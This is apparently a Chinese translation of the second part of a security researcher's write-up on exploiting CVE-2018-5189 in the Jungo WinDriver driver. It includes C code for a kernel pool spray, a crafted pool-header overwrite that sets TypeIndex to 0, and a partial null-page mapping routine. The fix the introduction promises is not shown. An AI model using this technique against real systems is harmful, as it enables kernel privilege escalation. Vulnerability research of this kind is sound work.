# Jungo Windriver 中的代码执行漏洞（CVE-2018-5189）分析（下）

##### 译文声明
本文是翻译文章，原文作者为 Fidus InfoSecurity，来源于 fidusinfosec.com。译文仅供参考，具体内容和含义以原文为准。

## 传送门
[Jungo Windriver 中的代码执行漏洞（CVE-2018-5189）分析（上）](https://www.anquanke.com/post/id/94526)

## 写在前面的话
在本系列文章的前一部分中，我们介绍了关于 CVE-2018-5189 漏洞利用代码开发过程中的准备工作和方法。在这篇文章中，我们将解决之前遇到的一些问题，并提供一个完整的 PoC 实现思路。此外，我们还将介绍针对该漏洞的修复方案。

## 漏洞研究
在开发针对 CVE-2018-5189 的利用代码时，有几点非常关键：

1. 我们能够控制内核池分配空间的大小（传递过去的大小为 (size - 1) * 0xa + 0x48）。
2. 池喷射的基本模式包括：
   - 不断创建相同大小的对象；
   - 释放特定大小对象并在随机位置创建空白区域；
   - 触发包含漏洞的驱动程序，并填充分配给内核池的空白区域。

经过多次尝试后，我们决定使用 Event 对象来实现目标。以下函数可以完成内核池喷射，填充大量 Event 对象，并在随机位置创建 0x380 字节的空白区域：

```c
void spray_pool(HANDLE handle_arr[])
{
    // 创建 SPRAY_SIZE 个 Event 对象以填满池
    for (int i = 0; i < SPRAY_SIZE; i++) {
        handle_arr[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
    }
    // 在随机位置释放特定大小的对象并创建空白区域
    for (int i = 0; i < SPRAY_SIZE; i += RANDOM_INTERVAL) {
        CloseHandle(handle_arr[i]);
    }
}
```

### 内核池状态示例
以下是内核池的状态示例：

```
!poolpage 0x861306C0
walking pool page @ 86130000
Addr A/F BlockSize PreviousSize PoolIndex PoolType Tag
86130000: InUse 0040 (008) 0000 (000) 00 02 Eve.
...
*861306c0: Free 0380 (070) 0040 (008) 00 04 RDW. —- here
...
```

这意味着我们可以完全控制下一个要中断的对象，从而解决了之前的两个问题。接下来，我们需要弄清楚如何利用 Event 对象实现代码执行。

### 利用 Event 对象
通过重写 `typeIndex`，我们可以利用 Event 对象。对 Event 对象进行分析后，我们发现了一些可能的切入点：

```c
kd>; dt nt!_POOL_HEADER 8514fac0
+0x000 PreviousSize : 0y010001100 (0x8c)
+0x000 PoolIndex : 0y0000000 (0)
+0x002 BlockSize : 0y000001000 (0x8)
+0x002 PoolType : 0y0000010 (0x2)
+0x000 Ulong1 : 0x408008c —- here
+0x004 PoolTag : 0xee657645 — here
...
```

我们需要将 `PreviousSize` 值设置为 0x380（RDW 池缓冲区的大小），并保持其他值不变，除了 `TypeIndex`。`TypeIndex` 是指向描述块类型的指针数组的索引。

如果我们将 `TypeIndex` 重写为 0，对象将尝试在一个空页面中查找对应的 `OBJECT_TYPE` 信息。因此，我们需要映射一个空白页面并创建我们自己的 `OkayToClose` 过程。

### 用户空间缓冲区修改
首先，我们需要修改用户空间缓冲区，使其包含正确的值：

```c
// 池头块
*(ULONG *)(user_buff + 0x374) = 0x04080070; // ULONG1
*(ULONG *)(user_buff + 0x378) = 0xee657645; // PoolTag

// 配额信息块
*(ULONG *)(user_buff + 0x37c) = 0x00000000; // PagedPoolCharge
*(ULONG *)(user_buff + 0x380) = 0x00000040; // NonPagedPoolCharge
*(ULONG *)(user_buff + 0x384) = 0x00000000; // SecurityDescriptorCharge
*(ULONG *)(user_buff + 0x388) = 0x00000000; // SecurityDescriptorQuotaBlock

// Event 头块
*(ULONG *)(user_buff + 0x38c) = 0x00000001; // PointerCount
*(ULONG *)(user_buff + 0x390) = 0x00000001; // HandleCount
*(ULONG *)(user_buff + 0x394) = 0x00000000; // NextToFree
*(ULONG *)(user_buff + 0x398) = 0x00080000; // TypeIndex
```

### 映射空白页面
最后一步是映射一个空白页面，并放置一个指向我们要执行的函数指针（在内核模式下）。以下函数可以帮助我们实现这一目标：

```c
BOOL map_null_page()
{
    HMODULE hmodule = LoadLibraryA("ntdll.dll");
    if (hmodule == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // 映射空白页面的代码
    // ...
}
```

通过这些步骤，我们成功实现了对 CVE-2018-5189 漏洞的利用。希望这篇文章能帮助读者更好地理解该漏洞及其利用方法。